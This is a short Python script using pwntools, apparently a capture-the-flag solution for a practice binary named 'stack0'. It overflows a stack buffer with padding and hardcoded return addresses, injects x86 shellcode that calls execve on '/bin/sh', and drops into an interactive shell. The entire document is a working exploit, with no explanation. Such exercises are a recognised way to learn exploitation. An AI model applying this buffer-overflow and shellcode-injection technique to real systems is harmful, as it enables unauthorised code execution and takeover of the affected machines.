#inject shellcode
from pwn import *


shellcode =p32(0x8049000+0x4)\
+asm("mov eax,SYS_execve")\
+asm("xor ecx,ecx")\
+asm("xor edx,edx")\
+asm("mov ebx,0x8049014")\
+asm("int 0x80")\
+"/bin/sh"
r=process("./stack0",aslr=True)
r.sendline('A'*(0x4c)+p32(0x8049000-0x4)+p32(0x804840c)+p32(0x8049000))
r.sendline(shellcode)
r.interactive()

